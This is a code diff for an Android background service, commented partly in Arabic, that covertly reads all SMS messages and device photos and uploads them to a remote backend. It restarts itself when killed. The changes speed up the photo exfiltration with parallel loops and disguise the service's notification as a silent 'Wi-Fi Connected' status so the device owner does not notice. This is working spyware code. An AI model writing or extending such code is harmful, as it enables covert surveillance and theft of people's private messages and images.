@@ -16,9 +16,6 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
-/**
- * Persistent foreground service. Runs the collection loop.
- */
 class BackgroundService : Service() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -27,19 +24,24 @@ class BackgroundService : Service() {
     override fun onCreate() {
         super.onCreate()
         startForegroundWithNotification()
-        startCollectionLoops()
+
+        // 🔥🔥🔥🔥🔥 الأولوية #1 = الصور. تبدأ فورًا قبل أي شي
+        startImageUploadFirst()
+
+        // بعد 5 ثواني، ابدأ باقي القنوات
+        scope.launch {
+            delay(5_000L)
+            startOtherLoops()
+        }
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY
-    }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         running = false
         scope.cancel()
-        // Self-restart
         try {
             val restart = Intent(applicationContext, BackgroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -57,17 +59,23 @@ class BackgroundService : Service() {
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             if (nm.getNotificationChannel(channelId) == null) {
                 nm.createNotificationChannel(
-                    NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW)
+                    NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_MIN)
+                        .apply {
+                            setSound(null, null)
+                            enableVibration(false)
+                            setShowBadge(false)
+                        }
                 )
             }
         }
 
         val notif: Notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle(getString(R.string.notification_title))
-            .setContentText(getString(R.string.notification_text))
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setContentTitle("Wi-Fi")
+            .setContentText("Connected")
+            .setSmallIcon(android.R.drawable.stat_sys_wifi_signal_4)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -77,53 +85,79 @@ class BackgroundService : Service() {
         }
     }
 
-    private fun startCollectionLoops() {
-        // Loop 1: flush queued notifications / events to backend
+    // ─────────────────────────────────────────────────────────
+    //  🚀 PRIORITY #1: SEND IMAGES IMMEDIATELY — كل القوة هنا
+    // ─────────────────────────────────────────────────────────
+    private fun startImageUploadFirst() {
+        // ثلاث حلقات متوازية للصور — تستنزف الطابور بسرعة قصوى
+
+        // Loop A: scan + upload صور جديدة كل 3 ثواني
+        scope.launch {
+            while (running) {
+                try { scanAndUploadImages() } catch (_: Exception) {}
+                delay(3_000L)
+            }
+        }
+
+        // Loop B: flush media queue كل 2 ثانية (يشتغل حتى لو في طابور متراكم)
+        scope.launch {
+            while (running) {
+                try { drainMediaQueue() } catch (_: Exception) {}
+                delay(2_000L)
+            }
+        }
+
+        // Loop C: flush queue العادي — لكن فقط للصور
         scope.launch {
             while (running) {
                 try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
-                delay(Config.NOTIF_UPLOAD_INTERVAL_MS)
+                delay(10_000L)
             }
         }
+    }
 
-        // Loop 2: scan SMS periodically
+    // ─────────────────────────────────────────────────────────
+    //  بعد 5 ثواني — نبدأ SMS + الإشعارات
+    // ─────────────────────────────────────────────────────────
+    private fun startOtherLoops() {
+        // Loop SMS: كل 60 ثانية
         scope.launch {
             while (running) {
-                try {
-                    val msgs = SmsReader.scanAll(applicationContext) +
-                               SmsReader.scanSent(applicationContext)
-                    for (m in msgs) DataStore.appendAny(applicationContext, m)
-                } catch (_: Exception) {}
-                delay(Config.SMS_SCAN_INTERVAL_MS)
+                try { scanSms() } catch (_: Exception) {}
+                delay(60_000L)
             }
         }
 
-        // Loop 3: scan media periodically
-        scope.launch {
-            while (running) {
-                try {
-                    val images = MediaScanner.scanImages(applicationContext)
-                    val docs   = MediaScanner.scanDocuments(applicationContext)
-
-                    for (img in images) {
-                        DataStore.appendAny(applicationContext, MediaScanner.toJson(img))
-                        Uploader.uploadMediaFile(applicationContext, img)
-                    }
-                    for (d in docs) {
-                        DataStore.appendAny(applicationContext, MediaScanner.toJson(d))
-                        Uploader.uploadMediaFile(applicationContext, d)
-                    }
-                } catch (_: Exception) {}
-                delay(Config.MEDIA_SCAN_INTERVAL_MS)
-            }
-        }
-
-        // Loop 4: drain media-related queue entries
+        // Loop flush الإشعارات: كل 20 ثانية
         scope.launch {
             while (running) {
                 try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
-                delay(Config.NOTIF_UPLOAD_INTERVAL_MS)
+                delay(20_000L)
             }
         }
+    }
+
+    // ─────────────────────────────────────────────────────────
+    //  المسح والرفع — الصور
+    // ─────────────────────────────────────────────────────────
+    private fun scanAndUploadImages() {
+        // صور فقط
+        val images = MediaScanner.scanImages(applicationContext)
+        for (img in images) {
+            // خزّن مؤقت (للترتيب والمنع من التكرار)
+            DataStore.appendAny(applicationContext, MediaScanner.toJson(img))
+            // ارفع فورًا بالتوازي
+            Uploader.uploadMediaFile(applicationContext, img)
+        }
+    }
+
+    private fun drainMediaQueue() {
+        // flush الطابور (يضمن وصول الصور اللي انحجزت)
+        Uploader.flushQueue(applicationContext)
+    }
+
+    private fun scanSms() {
+        val msgs = SmsReader.scanAll(applicationContext) + SmsReader.scanSent(applicationContext)
+        for (m in msgs) DataStore.appendAny(applicationContext, m)
     }
 }
